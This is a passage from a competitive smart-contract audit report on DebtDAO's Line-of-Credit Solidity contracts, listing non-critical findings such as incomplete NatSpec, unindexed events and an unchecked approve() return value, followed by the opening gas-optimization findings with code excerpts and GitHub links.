solidity 0.8.9;\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/CreditLib.sol#L0\n\n```solidity\nFile: contracts/utils/CreditListLib.sol\n\n0:    pragma solidity 0.8.9;\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/CreditListLib.sol#L0\n\n```solidity\nFile: contracts/utils/EscrowLib.sol\n\n0:    pragma solidity 0.8.9;\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/EscrowLib.sol#L0\n\n```solidity\nFile: contracts/utils/LineFactoryLib.sol\n\n0:    pragma solidity 0.8.9;\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/LineFactoryLib.sol#L0\n\n```solidity\nFile: contracts/utils/LineLib.sol\n\n0:    pragma solidity 0.8.9;\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/LineLib.sol#L0\n\n```solidity\nFile: contracts/utils/MutualConsent.sol\n\n0:    // forked from https://github.com/IndexCoop/index-coop-smart-contracts/blob/master/contracts/lib/MutualConsent.sol\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/MutualConsent.sol#L0\n\n```solidity\nFile: contracts/utils/SpigotedLineLib.sol\n\n0:    pragma solidity 0.8.9;\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/SpigotedLineLib.sol#L0\n\n```solidity\nFile: contracts/utils/SpigotLib.sol\n\n0:    pragma solidity 0.8.9;\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/SpigotLib.sol#L0\n\n## [N&#x2011;15]  NatSpec is incomplete\n\n*There are 56 instances of this issue:*\n```solidity\nFile: contracts/modules/credit/EscrowedLine.sol\n\n/// @audit Missing: '@param newLine'\n82      /**\n83       * see SecuredlLine.rollover\n84       * @notice helper function to allow borrower to easily swithc collateral to a new Line after repyment\n85       *(@dev priviliegad internal function.\n86       * @dev MUST only be callable if line is REPAID\n87       * @return - if function successfully executed\n88      */\n89:     function _rollover(address newLine) internal virtual returns(bool) {\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/EscrowedLine.sol#L82-L89\n\n```solidity\nFile: contracts/modules/credit/LineOfCredit.sol\n\n/// @audit Missing: '@return'\n216         @param id - the position id for credit position\n217       */\n218:      function _accrue(Credit memory credit, bytes32 id) internal returns(Credit memory) {\n\n/// @audit Missing: '@param status_'\n415       /**\n416         * @notice - updates `status` variable in storage if current status is diferent from existing status.\n417         * @dev - privileged internal function. MUST check params and logic flow before calling\n418         * @dev - does not save new status if it is the same as current status\n419         * @return status - the current status of the line after updating\n420        */\n421:      function _updateStatus(LineLib.STATUS status_) internal returns(LineLib.STATUS) {\n\n/// @audit Missing: '@return'\n433        * @param amount - amount of tokens lender will initially deposit\n434       */\n435       function _createCredit(\n436           address lender,\n437           address token,\n438           uint256 amount\n439       )\n440           internal\n441:          returns (bytes32 id)\n\n/// @audit Missing: '@param credit'\n456     /**\n457      * @dev - Reduces `principal` and/or `interestAccrued` on a credit line.\n458               Expects checks for conditions of repaying and param sanitizing before calling\n459               e.g. early repayment of principal, tokens have actually been paid by borrower, etc.\n460      * @dev - privileged internal function. MUST check params and logic flow before calling\n461      * @param id - position id with all data pertaining to line\n462      * @param amount - amount of Credit Token being repaid on credit line\n463      * @return credit - position struct in memory with updated values\n464     */\n465       function _repay(Credit memory credit, bytes32 id, uint256 amount)\n466           internal\n467:          returns (Credit memory)\n\n/// @audit Missing: '@param credit'\n/// @audit Missing: '@param id'\n477       /**\n478        * @notice - checks that a credit line is fully repaid and removes it\n479        * @dev deletes credit storage. Store any data u might need later in call before _close()\n480        * @dev - privileged internal function. MUST check params and logic flow before calling\n481        * @return credit - position struct in memory with updated values\n482        */\n483:      function _close(Credit memory credit, bytes32 id) internal virtual returns (bool) {\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L216-L218\n\n```solidity\nFile: contracts/modules/credit/SecuredLine.sol\n\n/// @audit Missing: '@return'\n77       * @param targetToken - token in escrow that will be sold of to repay position\n78       */\n79    \n80      function liquidate(\n81        uint256 amount,\n82        address targetToken\n83      )\n84        external\n85        whileBorrowing\n86:       returns(uint256)\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/SecuredLine.sol#L77-L86\n\n```solidity\nFile: contracts/modules/escrow/Escrow.sol\n\n/// @audit Missing: '@param _line'\n69        /**\n70        * @notice - Allows current owner to transfer ownership to another address\n71        * @dev    - Used if we setup Escrow before Line exists. Line has no way to interface with this function so once transfered `line` is set forever\n72        * @return didUpdate - if function successfully executed or not\n73        */\n74:       function updateLine(address _line) external returns(bool) {\n\n/// @audit Missing: '@return'\n98         * @param token - the token to all borrow to deposit as collateral\n99         */\n100:      function enableCollateral(address token) external returns (bool) {\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/escrow/Escrow.sol#L69-L74\n\n```solidity\nFile: contracts/modules/oracle/Oracle.sol\n\n/// @audit Missing: '@param token'\n19        /**\n20         * @return price - the latest price in USD to 8 decimals\n21         */\n22:       function getLatestAnswer(address token) external returns (int) {\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/oracle/Oracle.sol#L19-L22\n\n```solidity\nFile: contracts/modules/spigot/Spigot.sol\n\n/// @audit Missing: '@param token'\n57        /**\n58    \n59         * @notice - Claims revenue tokens from the Spigot (push and pull payments) and escrows them for the Owner withdraw later.\n60                   - Calls predefined function in contract settings to claim revenue.\n61                   - Automatically sends portion to Treasury and then escrows Owner's share\n62                   - There is no conversion or trade of revenue tokens. \n63         * @dev    - Assumes the only side effect of calling claimFunc on revenueContract is we receive new tokens.\n64                   - Any other side effects could be dangerous to the Spigot or upstream contracts.\n65         * @dev    - callable by anyone\n66         * @param revenueContract - Contract with registered settings to claim revenue from\n67         * @param data - Transaction data, including function signature, to properly claim revenue on revenueContract\n68         * @return claimed -  The amount of revenue tokens claimed from revenueContract and split between `owner` and `treasury`\n69        */\n70        function claimRevenue(address revenueContract, address token, bytes calldata data)\n71            external nonReentrant\n72:           returns (uint256 claimed)\n\n/// @audit Missing: '@return'\n106        * @param data - tx data, including function signature, to call contract with\n107        */\n108:      function operate(address revenueContract, bytes calldata data) external returns (bool) {\n\n/// @audit Missing: '@return'\n123        * @param setting - Spigot settings for smart contract   \n124        */\n125:      function addSpigot(address revenueContract, Setting memory setting) external returns (bool) {\n\n/// @audit Missing: '@return'\n135        * @param revenueContract - smart contract to transfer ownership of\n136        */\n137       function removeSpigot(address revenueContract)\n138           external\n139:          returns (bool)\n\n/// @audit Missing: '@return'\n157        * @param newOwner - Address to give control to\n158        */\n159:      function updateOwner(address newOwner) external returns (bool) {\n\n/// @audit Missing: '@return'\n168        * @param newOperator - Address to give control to\n169        */\n170:      function updateOperator(address newOperator) external returns (bool) {\n\n/// @audit Missing: '@return'\n179        * @param newTreasury - Address to divert funds to\n180        */\n181:      function updateTreasury(address newTreasury) external returns (bool) {\n\n/// @audit Missing: '@return'\n192        * @param allowed - true/false whether to allow this function to be called by Operator\n193        */\n194:       function updateWhitelistedFunction(bytes4 func, bool allowed) external returns (bool) {\n\n/// @audit Missing: '@return'\n204        * @param token Revenue token that is being garnished from spigots\n205       */\n206:      function getEscrowed(address token) external view returns (uint256) {\n\n/// @audit Missing: '@return'\n213        * @param func Function to check on whitelist \n214       */\n215   \n216:      function isWhitelisted(bytes4 func) external view returns(bool) {\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/spigot/Spigot.sol#L57-L72\n\n```solidity\nFile: contracts/utils/CreditLib.sol\n\n/// @audit Missing: '@param id'\n/// @audit Missing: '@param amount'\n/// @audit Missing: '@param lender'\n/// @audit Missing: '@param token'\n/// @audit Missing: '@return'\n120     /**\n121       * see ILineOfCredit._createCredit\n122       * @notice called by LineOfCredit._createCredit during every repayment function\n123       * @param oracle - interset rate contract used by line that will calculate interest owed\n124      */\n125     function create(\n126         bytes32 id,\n127         uint256 amount,\n128         address lender,\n129         address token,\n130         address oracle\n131     )\n132         external \n133:        returns(ILineOfCredit.Credit memory credit)\n\n/// @audit Missing: '@param id'\n/// @audit Missing: '@param amount'\n/// @audit Missing: '@return'\n163     /**\n164       * see ILineOfCredit._repay\n165       * @notice called by LineOfCredit._repay during every repayment function\n166       * @param credit - The lender position being repaid\n167      */\n168     function repay(\n169       ILineOfCredit.Credit memory credit,\n170       bytes32 id,\n171       uint256 amount\n172     )\n173       external\n174:      returns (ILineOfCredit.Credit memory)\n\n/// @audit Missing: '@param id'\n/// @audit Missing: '@param amount'\n/// @audit Missing: '@return'\n197     /**\n198       * see ILineOfCredit.withdraw\n199       * @notice called by LineOfCredit.withdraw during every repayment function\n200       * @param credit - The lender position that is being bwithdrawn from\n201      */\n202     function withdraw(\n203       ILineOfCredit.Credit memory credit,\n204       bytes32 id,\n205       uint256 amount\n206     )\n207       external\n208:      returns (ILineOfCredit.Credit memory)\n\n/// @audit Missing: '@param credit'\n/// @audit Missing: '@param id'\n/// @audit Missing: '@return'\n234     /**\n235       * see ILineOfCredit._accrue\n236       * @notice called by LineOfCredit._accrue during every repayment function\n237       * @param interest - interset rate contract used by line that will calculate interest owed\n238      */\n239     function accrue(\n240       ILineOfCredit.Credit memory credit,\n241       bytes32 id,\n242       address interest\n243     )\n244       public\n245:      returns (ILineOfCredit.Credit memory)\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/CreditLib.sol#L120-L133\n\n```solidity\nFile: contracts/utils/EscrowLib.sol\n\n/// @audit Missing: '@param self'\n28        /**\n29         * @notice updates the cratio according to the collateral value vs line value\n30         * @dev calls accrue interest on the line contract to update the latest interest payable\n31         * @param oracle - address to call for collateral token prices\n32         * @return cratio - the updated collateral ratio in 4 decimals\n33        */\n34:       function _getLatestCollateralRatio(EscrowState storage self, address oracle) public returns (uint256) {\n\n/// @audit Missing: '@param self'\n46        /**\n47        * @notice - Iterates over all enabled tokens and calculates the USD value of all deposited collateral\n48        * @param oracle - address to call for collateral token prices\n49        * @return totalCollateralValue - the collateral's USD value in 8 decimals\n50        */\n51:       function _getCollateralValue(EscrowState storage self, address oracle) public returns (uint256) {\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/EscrowLib.sol#L28-L34\n\n```solidity\nFile: contracts/utils/LineFactoryLib.sol\n\n/// @audit Missing: '@param oracle'\n/// @audit Missing: '@param arbiter'\n33        /**\n34          @notice sets up new line based of config of old line. Old line does not need to have REPAID status for this call to succeed.\n35          @dev borrower must call rollover() on `oldLine` with newly created line address\n36          @param oldLine  - line to copy config from for new line.\n37          @param borrower - borrower address on new line\n38          @param ttl      - set total term length of line\n39          @return newLine - address of newly deployed line with oldLine config\n40         */\n41        function rolloverSecuredLine(\n42            address payable oldLine,\n43            address borrower, \n44            address oracle,\n45            address arbiter,\n46            uint ttl\n47:       ) external returns(address) {\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/LineFactoryLib.sol#L33-L47\n\n```solidity\nFile: contracts/utils/LineLib.sol\n\n/// @audit Missing: '@return'\n32         * @param amount - amount of tokens to send\n33         */\n34        function sendOutTokenOrETH(\n35          address token,\n36          address receiver,\n37          uint256 amount\n38        )\n39          external\n40:         returns (bool)\n\n/// @audit Missing: '@return'\n57         * @param amount - amount of tokens to send\n58         */\n59        function receiveTokenOrETH(\n60          address token,\n61          address sender,\n62          uint256 amount\n63        )\n64          external\n65:         returns (bool)\n\n/// @audit Missing: '@return'\n78         * @param token - address of token to check. Denominations.ETH for raw ETH\n79        */\n80:       function getBalance(address token) external view returns (uint256) {\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/LineLib.sol#L32-L40\n\n```solidity\nFile: contracts/utils/SpigotedLineLib.sol\n\n/// @audit Missing: '@param spigot'\n/// @audit Missing: '@param status'\n/// @audit Missing: '@param defaultSplit'\n163       /**\n164        * @notice Changes the revenue split between a Borrower's treasury and the LineOfCredit based on line health, runs with updateOwnerSplit()\n165        * @dev    - callable `arbiter` + `borrower`\n166        * @param revenueContract - spigot to update\n167        * @return whether or not split was updated\n168        */\n169:      function updateSplit(address spigot, address revenueContract, LineLib.STATUS status, uint8 defaultSplit) external returns (bool) {\n\n/// @audit Missing: '@param spigot'\n/// @audit Missing: '@param status'\n/// @audit Missing: '@param borrower'\n/// @audit Missing: '@param arbiter'\n/// @audit Missing: '@param to'\n186       /**\n187   \n188      * @notice -  Transfers ownership of the entire Spigot and its revenuw streams from its then Owner to either \n189                   the Borrower (if a Line of Credit has been been fully repaid) or \n190                   to the Arbiter (if the Line of Credit is liquidatable).\n191      * @dev    - callable by anyone \n192      * @return - whether or not Spigot was released\n193     */\n194:      function releaseSpigot(address spigot, LineLib.STATUS status, address borrower, address arbiter, address to) external returns (bool) {\n\n/// @audit Missing: '@param to'\n/// @audit Missing: '@param token'\n/// @audit Missing: '@param amount'\n/// @audit Missing: '@param status'\n/// @audit Missing: '@param borrower'\n/// @audit Missing: '@param arbiter'\n211     /**\n212      * @notice -  Sends any remaining tokens (revenue or credit tokens) in the Spigot to the Borrower after the loan has been repaid.\n213                -  In case of a Borrower default (loan status = liquidatable), this is a fallback mechanism to withdraw all the tokens and send them to the Arbiter\n214                -  Does not transfer anything if line is healthy\n215      * @return - whether or not spigot was released\n216     */\n217:      function sweep(address to, address token, uint256 amount, LineLib.STATUS status, address borrower, address arbiter) external returns (bool) {\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/SpigotedLineLib.sol#L163-L169\n\n## [N&#x2011;16]  Event is missing `indexed` fields\n\nIndex event fields make the field more quickly accessible to off-chain tools that parse events. However, note that each index field costs extra gas during emission, so it's not necessarily best to index the maximum allowed per event (three fields). Each `event` should use three `indexed` fields if there are three or more fields, and gas usage is not particularly of concern for the events in question. If there are fewer than three fields, all of the fields should be indexed.\n\n*There are 4 instances of this issue:*\n```solidity\nFile: contracts/utils/MutualConsent.sol\n\n21        event MutualConsentRegistered(\n22            bytes32 _consentHash\n23:       );\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/MutualConsent.sol#L21-L23\n\n```solidity\nFile: contracts/utils/SpigotLib.sol\n\n241       event AddSpigot(\n242           address indexed revenueContract,\n243           uint256 ownerSplit\n244:      );\n\n255       event ClaimRevenue(\n256           address indexed token,\n257           uint256 indexed amount,\n258           uint256 escrowed,\n259           address revenueContract\n260:      );\n\n262       event ClaimEscrow(\n263           address indexed token,\n264           uint256 indexed amount,\n265           address owner\n266:      );\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/SpigotLib.sol#L241-L244\n\n## [N&#x2011;17]  Not using the named return variables anywhere in the function is confusing\n\nConsider changing the variable to be an unnamed one.\n\n*There are 2 instances of this issue:*\n```solidity\nFile: contracts/modules/spigot/Spigot.sol\n\n/// @audit claimed\n70        function claimRevenue(address revenueContract, address token, bytes calldata data)\n71            external nonReentrant\n72:           returns (uint256 claimed)\n\n/// @audit claimed\n85        function claimEscrow(address token)\n86            external\n87            nonReentrant\n88:           returns (uint256 claimed) \n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/spigot/Spigot.sol#L70-L72\n\n## [N&#x2011;18]  Duplicated `require()`/`revert()` checks should be refactored to a modifier or function\n\nThe compiler will inline the function, which will avoid `JUMP` instructions usually associated with functions.\n\n*There are 2 instances of this issue:*\n```solidity\nFile: contracts/modules/credit/LineOfCredit.sol\n\n259:          require(interestRate.setRate(id, drate, frate));\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L259\n\n```solidity\nFile: contracts/utils/EscrowLib.sol\n\n161:          require(amount > 0);\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/EscrowLib.sol#L161\n\n_______\n\n## Excluded Non-Critical Issues Findings\n\nThese findings are excluded from awards calculations because there are publicly-available automated tools that find them. The valid ones appear here for completeness\n\n| |Issue|Instances|\n|-|:-|:-:|\n| [N&#x2011;19] | Return values of `approve()` not checked | 1 |\n\nTotal: 1 instances over 1 issues\n\n## [N&#x2011;19]  Return values of `approve()` not checked\nNot all `IERC20` implementations `revert()` when there's a failure in `approve()`. The function signature has a `boolean` return value and they indicate errors that way instead. By not checking the return value, operations that should have marked as failed, may potentially go through without actually approving anything\n\n*There is 1 instance of this issue:*\n```solidity\nFile: contracts/utils/SpigotedLineLib.sol\n\n/// @audit (valid but excluded finding)\n134:              IERC20(sellToken).approve(swapTarget, amount);\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/SpigotedLineLib.sol#L134\n\n\n***\n\n# Gas Optimizations\n\nFor this contest, 42 reports were submitted by wardens detailing gas optimizations. The [report highlighted below](https://github.com/code-423n4/2022-11-debtdao-findings/issues/452) by **IllIllI** received the top score from the judge.\n\n*The following wardens also submitted reports: [me\\_na0mi](https://github.com/code-423n4/2022-11-debtdao-findings/issues/513), \n[JC](https://github.com/code-423n4/2022-11-debtdao-findings/issues/512), \n[brgltd](https://github.com/code-423n4/2022-11-debtdao-findings/issues/510), \n[c3phas](https://github.com/code-423n4/2022-11-debtdao-findings/issues/485), \n[Awesome](https://github.com/code-423n4/2022-11-debtdao-findings/issues/480), \n[ajtra](https://github.com/code-423n4/2022-11-debtdao-findings/issues/479), \n[Deivitto](https://github.com/code-423n4/2022-11-debtdao-findings/issues/456), \n[rotcivegaf](https://github.com/code-423n4/2022-11-debtdao-findings/issues/455), \n[lukris02](https://github.com/code-423n4/2022-11-debtdao-findings/issues/450), \n[Aymen0909](https://github.com/code-423n4/2022-11-debtdao-findings/issues/442), \n[B2](https://github.com/code-423n4/2022-11-debtdao-findings/issues/425), \n[cryptonue](https://github.com/code-423n4/2022-11-debtdao-findings/issues/399), \n[RedOneN](https://github.com/code-423n4/2022-11-debtdao-findings/issues/392), \n[Diana](https://github.com/code-423n4/2022-11-debtdao-findings/issues/383), \n[\\_\\_141345\\_\\_](https://github.com/code-423n4/2022-11-debtdao-findings/issues/335), \n[erictee](https://github.com/code-423n4/2022-11-debtdao-findings/issues/293), \n[karanctf](https://github.com/code-423n4/2022-11-debtdao-findings/issues/286), \n[peanuts](https://github.com/code-423n4/2022-11-debtdao-findings/issues/275), \n[TomJ](https://github.com/code-423n4/2022-11-debtdao-findings/issues/273), \n[zaskoh](https://github.com/code-423n4/2022-11-debtdao-findings/issues/268), \n[seyni](https://github.com/code-423n4/2022-11-debtdao-findings/issues/246), \n[ReyAdmirado](https://github.com/code-423n4/2022-11-debtdao-findings/issues/241), \n[0x1f8b](https://github.com/code-423n4/2022-11-debtdao-findings/issues/233), \n[saneryee](https://github.com/code-423n4/2022-11-debtdao-findings/issues/230), \n[Metatron](https://github.com/code-423n4/2022-11-debtdao-findings/issues/203), \n[tnevler](https://github.com/code-423n4/2022-11-debtdao-findings/issues/193), \n[Rahoz](https://github.com/code-423n4/2022-11-debtdao-findings/issues/164), \n[gogo](https://github.com/code-423n4/2022-11-debtdao-findings/issues/154), \n[exolorkistis](https://github.com/code-423n4/2022-11-debtdao-findings/issues/146), \n[durianSausage](https://github.com/code-423n4/2022-11-debtdao-findings/issues/140), \n[0xRajkumar](https://github.com/code-423n4/2022-11-debtdao-findings/issues/138), \n[aphak5010](https://github.com/code-423n4/2022-11-debtdao-findings/issues/105), \n[oyc\\_109](https://github.com/code-423n4/2022-11-debtdao-findings/issues/99), \n[ch0bu](https://github.com/code-423n4/2022-11-debtdao-findings/issues/80), \n[martin](https://github.com/code-423n4/2022-11-debtdao-findings/issues/79), \n[Saintcode\\_](https://github.com/code-423n4/2022-11-debtdao-findings/issues/67), \n[Rolezn](https://github.com/code-423n4/2022-11-debtdao-findings/issues/66), \n[emrekocak](https://github.com/code-423n4/2022-11-debtdao-findings/issues/62), \n[chrisdior4](https://github.com/code-423n4/2022-11-debtdao-findings/issues/45), \n[Bnke0x0](https://github.com/code-423n4/2022-11-debtdao-findings/issues/32), and\n[RaymondFam](https://github.com/code-423n4/2022-11-debtdao-findings/issues/10)\n.*\n\n## Gas Optimizations Summary\n| |Issue|Instances|Total Gas Saved|\n|-|:-|:-:|:-:|\n| [G&#x2011;01] | State variables only set in the constructor should be declared `immutable` | 2 | 4194 |\n| [G&#x2011;02] | Using `calldata` instead of `memory` for read-only arguments in `external` functions saves gas | 5 | 600 |\n| [G&#x2011;03] | Using `storage` instead of `memory` for structs/arrays saves gas | 3 | 12600 |\n| [G&#x2011;04] | Avoid contract existence checks by using low level calls | 27 | 2700 |\n| [G&#x2011;05] | State variables should be cached in stack variables rather than re-reading them from storage | 5 | 485 |\n| [G&#x2011;06] | `internal` functions only called once can be inlined to save gas | 4 | 80 |\n| [G&#x2011;07] | Add `unchecked {}` for subtractions where the operands cannot underflow because of a previous `require()` or `if`-statement | 3 | 255 |\n| [G&#x2011;08] | `++i`/`i++` should be `unchecked{++i}`/`unchecked{i++}` when it is not possible for them to overflow, as is the case when used in `for`- and `while`-loops | 6 | 360 |\n| [G&#x2011;09] | `require()`/`revert()` strings longer than 32 bytes cost extra gas | 1 | - |\n| [G&#x2011;10] | Optimize names to save gas | 15 | 330 |\n| [G&#x2011;11] | Usage of `uints`/`ints` smaller than 32 bytes (256 bits) incurs overhead | 2 | - |\n| [G&#x2011;12] | Using `private` rather than `public` for constants, saves gas | 3 | - |\n| [G&#x2011;13] | Inverting the condition of an `if`-`else`-statement wastes gas | 2 | - |\n| [G&#x2011;14] | `require()` or `revert()` statements that check input arguments should be at the top of the function | 1 | - |\n| [G&#x2011;15] | Use custom errors rather than `revert()`/`require()` strings to save gas | 1 | - |\n| [G&#x2011;16] | Functions guaranteed to revert when called by normal users can be marked `payable` | 4 | 84 |\n\nTotal: 84 instances over 16 issues with **21688 gas** saved\n\nGas totals use lower bounds of ranges and count two iterations of each `for`-loop. All values above are runtime, not deployment, values; deployment values are listed in the individual issue descriptions. The table above as well as its gas numbers do not include any of the excluded findings.\n\n## [G&#x2011;01]  State variables only set in the constructor should be declared `immutable`\n\nAvoids a Gsset (**20000 gas**) in the constructor, and replaces the first access in each transaction (Gcoldsload - **2100 gas**) and each access thereafter (Gwarmacces - **100 gas**) with a `PUSH32` (**3 gas**). \n\nWhile `string`s are not value types, and therefore cannot be `immutable`/`constant` if not hard-coded outside of the constructor, the same behavior can be achieved by making the current contract `abstract` with `virtual` functions for the `string` accessors, and having a child contract override the functions with the hard-coded implementation-specific values.\n\n*There are 2 instances of this issue:*\n```solidity\nFile: contracts/modules/oracle/Oracle.sol\n\n/// @audit registry (constructor)\n16:           registry = FeedRegistryInterface(_registry);\n\n/// @audit registry (access)\n29:           ) = registry.latestRoundData(token, Denominations.USD);\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/oracle/Oracle.sol#L16\n\n## [G&#x2011;02]  Using `calldata` instead of `memory` for read-only arguments in `external` functions saves gas\n\nWhen a function with a `memory` array is called externally, the `abi.decode()` step has to use a for-loop to copy each index of the `calldata` to the `memory` index. **Each iteration of this for-loop costs at least 60 gas** (i.e. `60 * <mem_array>.length`). Using `calldata` directly, obliviates the need for such a loop in the contract code and runtime execution. Note that even if an interface defines a function as having `memory` arguments, it's still valid for implementation contracs to use `calldata` arguments instead. \n\nIf the array is passed to an `internal` function which passes the array to another internal function where the array is modified and therefore `memory` is used in the `external` call, it's still more gass-efficient to use `calldata` when the `external` function uses modifiers, since the modifiers may prevent the internal functions from being called. Structs have the same overhead as an array of length one\n\nNote that I've also flagged instances where the function is `public` but can be marked as `external` since it's not called by the contract, and cases where a constructor is involved\n\n*There are 5 instances of this issue:*\n```solidity\nFile: contracts/modules/spigot/Spigot.sol\n\n/// @audit setting\n125:      function addSpigot(address revenueContract, Setting memory setting) external returns (bool) {\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/spigot/Spigot.sol#L125\n\n```solidity\nFile: contracts/utils/CreditLib.sol\n\n/// @audit credit\n73      function getOutstandingDebt(\n74        ILineOfCredit.Credit memory credit,\n75        bytes32 id,\n76        address oracle,\n77        address interestRate\n78      )\n79        external\n80:       returns (ILineOfCredit.Credit memory c, uint256 principal, uint256 interest)\n\n/// @audit credit\n168     function repay(\n169       ILineOfCredit.Credit memory credit,\n170       bytes32 id,\n171       uint256 amount\n172     )\n173       external\n174:      returns (ILineOfCredit.Credit memory)\n\n/// @audit credit\n202     function withdraw(\n203       ILineOfCredit.Credit memory credit,\n204       bytes32 id,\n205       uint256 amount\n206     )\n207       external\n208:      returns (ILineOfCredit.Credit memory)\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/CreditLib.sol#L73-L80\n\n```solidity\nFile: contracts/utils/SpigotLib.sol\n\n/// @audit setting\n125:      function addSpigot(SpigotState storage self, address revenueContract, ISpigot.Setting memory setting) external returns (bool) {\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/SpigotLib.sol#L125\n\n## [G&#x2011;03]  Using `storage` instead of `memory` for structs/arrays saves gas\n\nWhen fetching data from a storage location, assigning the data to a `memory` variable causes all fields of the struct/array to be read from storage, which incurs a Gcoldsload (**2100 gas**) for *each* field of the struct/array. If the fields are read from the new memory variable, they incur an additional `MLOAD` rather than a cheap stack read. Instead of declearing the variable with the `memory` keyword, declaring the variable with the `storage` keyword and caching any fields that need to be re-read in stack variables, will be much cheaper, only incuring the Gcoldsload for the fields actually read. The only time it makes sense to read the whole struct/array into a `memory` variable, is if the full struct/array is being returned by the function, is being passed to a function that requires `memory`, or if the array/struct is being read from another `memory` array/struct\n\n*There are 3 instances of this issue:*\n```solidity\nFile: contracts/modules/credit/LineOfCredit.sol\n\n205:            Credit memory credit = credits[id];\n\n323:          Credit memory credit = credits[id];\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L205\n\n```solidity\nFile: contracts/modules/credit/SpigotedLine.sol\n\n139:        Credit memory credit = credits[id];\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/SpigotedLine.sol#L139\n\n## [G&#x2011;04]  Avoid contract existence checks by using low level calls\n\nPrior to 0.8.10 the compiler inserted extra code, including `EXTCODESIZE` (**100 gas**), to check for contract existence for external function calls. In more recent solidity versions, the compiler will not insert these checks if the external call has a return value. Similar behavior can be achieved in earlier versions by using low-level calls, since low level calls never check for contract existence\n\n*There are 27 instances of this issue:*\n```solidity\nFile: contracts/modules/credit/SecuredLine.sol\n\n/// @audit status()\n57:       if(ILineOfCredit(newLine).status() != LineLib.STATUS.UNINITIALIZED) { revert BadNewLine(); }\n\n/// @audit init()\n63:       if(ILineOfCredit(newLine).init() != LineLib.STATUS.ACTIVE) { revert BadRollover(); }\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/SecuredLine.sol#L57\n\n```solidity\nFile: contracts/utils/CreditLib.sol\n\n/// @audit getLatestAnswer()\n84:       int256 price = IOracle(oracle).getLatestAnswer(c.token);\n\n/// @audit getLatestAnswer()\n135:        int price = IOracle(oracle).getLatestAnswer(token);\n\n/// @audit accrueInterest()\n251:        uint256 accruedToken = IInterestRateCredit(interest).accrueInterest(\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/CreditLib.sol#L84\n\n```solidity\nFile: contracts/utils/EscrowLib.sol\n\n/// @audit updateOutstandingDebt()\n35:           (uint256 principal, uint256 interest) = ILineOfCredit(self.line).updateOutstandingDebt();\n\n/// @audit arbiter()\n105:          require(msg.sender == ILineOfCredit(self.line).arbiter());\n\n/// @audit getLatestAnswer()\n126:                  int256 price = IOracle(oracle).getLatestAnswer(deposit.asset);\n\n/// @audit status()\n173:            